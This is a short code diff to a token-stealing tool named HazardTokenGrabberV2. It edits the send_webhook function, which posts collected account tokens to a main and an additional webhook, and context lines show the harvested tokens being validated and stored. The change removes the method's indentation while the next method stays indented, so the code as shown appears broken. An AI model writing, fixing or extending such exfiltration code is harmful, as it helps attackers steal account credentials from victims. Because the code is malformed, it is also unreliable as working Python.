@@ -263,9 +263,11 @@ class HazardTokenGrabberV2(Functions):
         if r.status_code == 200 and tkn not in self.tokens:
             self.tokens.append(tkn)
 
-    def send_webhook(self, data):
-        httpx.post(self.webhook, json=data)
-        httpx.post(self.additionalWebhook, json=data)
+def send_webhook(self, data):
+    if self.webhook:
+        httpx.post(self.webhook, json=data) 
+    if self.additionalWebhook:
+        httpx.post(self.additionalWebhook, json=data) 
 
     async def init(self):
         if self.webhook == "" or self.webhook == "\x57EBHOOK_HERE":
